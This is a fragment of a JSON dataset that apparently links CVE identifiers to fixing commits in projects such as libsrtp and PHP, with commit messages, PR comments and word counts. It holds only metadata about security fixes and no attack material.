            "commit_url": "https://github.com/cisco/libsrtp/commit/0acbb039c12b790621839facf56bfedbd071b74d",
            "commit_msg": "Undo the changes to the RTCP profile helper function.  The prior commit was not compliant with RFC 3711.",
            "commit_msg_words": 18,
            "other_info": "Docupdate Looks good to me. Will we have a branch cut after this merge?",
            "pr_title_words": 1,
            "comments_words": 13,
            "total_other_info_words": 14
        }
    ],
    "2011": [
        {
            "cve-id": "CVE-2011-4718",
            "commit_url": "https://github.com/php/php-src/commit/25e8fcc88fa20dc9d4c47184471003f436927cde",
            "commit_msg": "Strict session",
            "commit_msg_words": 2,
            "other_info": "Php 5.5 strict session collision detection",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        }
    ]
}